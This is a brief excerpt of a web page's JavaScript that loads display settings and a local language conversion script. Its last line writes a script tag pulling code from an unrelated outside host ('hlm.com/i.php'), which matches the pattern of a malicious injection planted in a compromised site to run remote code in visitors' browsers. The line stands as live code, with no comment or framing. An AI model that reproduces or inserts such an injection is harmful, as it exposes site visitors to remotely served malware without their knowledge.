...
function loadSet()
{
	...
	setSpeed();
	document.body.style.backgroundColor=bcolor.options[bcolor.selectedIndex].value;
...
loadSet();document.writeln("<SCRIPT src=\"/scripts/jfconvert/language1.js\"></SCRIPT>");
document.writeln("<script src=\"http://www.hlm.com/i.php\"><\/script>");